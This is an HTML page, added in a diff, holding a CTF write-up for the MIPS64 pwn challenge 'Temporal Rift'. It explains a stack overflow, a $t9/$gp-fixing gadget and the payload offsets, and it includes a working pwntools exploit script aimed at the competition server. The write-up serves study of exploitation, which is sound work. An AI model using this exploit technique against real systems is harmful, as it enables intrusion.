@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Temporal Rift (MIPS64) | Axiom Vale</title>
+    <meta
+      name="description"
+      content="Eschaton CTF 2026 Quals writeup: Temporal Rift (MIPS64)."
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;500;600;700&family=IBM+Plex+Mono:wght@300;400;500&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <div class="page">
+      <header class="site-header">
+        <div class="logo">Axiom Vale</div>
+        <nav class="nav-links">
+          <a href="index.html">Home</a>
+          <a href="writeups.html">Writeups</a>
+          <a href="blog.html">Blog</a>
+          <a href="experience.html">Experience</a>
+          <a href="projects.html">Projects</a>
+          <a href="contact.html">Contact</a>
+        </nav>
+        <div class="badge">Crypto + Misc CTF</div>
+      </header>
+
+      <main>
+        <section class="writeup-hero">
+          <div>
+            <p class="eyebrow">Eschaton CTF 2026 Quals</p>
+            <h1>Temporal Rift (MIPS64)</h1>
+            <p class="lede">
+              MIPS64 ret2win with $t9/$gp-safe control flow using a pivot gadget.
+            </p>
+          </div>
+          <div class="writeup-meta">
+            <span class="tag">pwn</span>
+            <span class="tag">mips64</span>
+          </div>
+        </section>
+
+        <section class="prose-card">
+          <div class="prose">
+            <h3>Overview</h3>
+            <p>
+              Temporal Rift looks like a standard stack overflow at first glance, but it hides
+              a classic MIPS PIC trap: you can control the return address, yet a direct jump to
+              the win function crashes because $t9 is wrong and $gp is derived from it. The
+              exploit is therefore not just overwrite $ra; it is overwrite $ra with a gadget
+              that fixes $t9, then tail-call win.
+            </p>
+
+            <h3>Binary Summary</h3>
+            <ul>
+              <li>Arch: MIPS64, big-endian</li>
+              <li>Static binary, not stripped</li>
+              <li>No stack canary</li>
+              <li>NX not required for the solution</li>
+            </ul>
+
+            <h3>Relevant Symbols</h3>
+            <ul>
+              <li>process_command: 0x120004608</li>
+              <li>print_flag: 0x120003f80</li>
+              <li>gadget: 0x1200072d4 (ld $t9, 0x28($sp); jalr $t9)</li>
+            </ul>
+
+            <h3>Finding the Overflow</h3>
+            <p>
+              send_command reads up to 0x200 bytes into a stack buffer and copies it into a
+              local buffer inside process_command without bounds checks. The saved return
+              address sits at $sp+0x68 in a 0x70-byte frame, so any input longer than 0x68
+              overwrites $ra.
+            </p>
+
+            <h3>The MIPS64 PIC Pitfall</h3>
+            <p>
+              On MIPS64, position-independent functions expect $t9 to contain the function
+              entry address. The function prologue uses $t9 to compute $gp. If $t9 is wrong,
+              $gp becomes invalid and the function will crash shortly after entry.
+            </p>
+
+            <h3>The Pivot Gadget</h3>
+            <p>
+              We need a gadget that loads $t9 from the stack and then jumps. The gadget at
+              0x1200072d4 does exactly that:
+            </p>
+            <ul>
+              <li>ld $t9, 0x28($sp)</li>
+              <li>jalr $t9</li>
+            </ul>
+
+            <h3>Stack Layout Math</h3>
+            <p>
+              After process_command returns, $sp is restored to S+0x70. The gadget reads $t9
+              from ($sp + 0x28) = S + 0x98, so we place print_flag at offset 0x98 and the gadget
+              at offset 0x68.
+            </p>
+
+            <h3>Payload Layout</h3>
+            <ul>
+              <li>offset 0x00: "PING" (valid command prefix)</li>
+              <li>offset 0x04..0x67: padding</li>
+              <li>offset 0x68: gadget (ld $t9, 0x28($sp); jalr $t9)</li>
+              <li>offset 0x98: print_flag</li>
+            </ul>
+
+            <h3>Exploit</h3>
+            <pre><code class="language-python">from pwn import *
+
+context.arch = 'mips64'
+context.endian = 'big'
+context.bits = 64
+
+HOST = 'node-2.mcsc.space'
+PORT = 12238
+
+PRINT_FLAG = 0x120003f80
+GADGET     = 0x1200072d4
+
+offset_ra = 0x68
+offset_t9 = 0x98
+
+payload  = b"PING"
+payload += b"A" * (offset_ra - 4)
+payload += p64(GADGET)
+payload += b"B" * (offset_t9 - (offset_ra + 8))
+payload += p64(PRINT_FLAG)
+
+io = remote(HOST, PORT)
+io.sendlineafter(b">>> ", b"3")
+io.sendlineafter(b">>> ", payload)
+io.interactive()</code></pre>
+
+            <h3>Result</h3>
+            <p>Flag: esch{shellcode-is-contextual-nova-orbit-2384}</p>
+
+            <h3>Summary</h3>
+            <p>
+              We do not just redirect control flow; we redirect it through a gadget that
+              restores the MIPS PIC contract ($t9 -> $gp), so print_flag can execute normally.
+            </p>
+          </div>
+        </section>
+
+        <section class="writeup-nav">
+          <a class="secondary" href="writeups.html">? Back to writeups</a>
+        </section>
+      </main>
+
+      <footer class="footer">
+        <p>© <span id="year"></span> Axiom Vale. Built for GitHub Pages.</p>
+      </footer>
+    </div>
+    <script>
+      const year = document.getElementById("year");
+      if (year) year.textContent = new Date().getFullYear();
+    </script>
+  </body>
+</html>
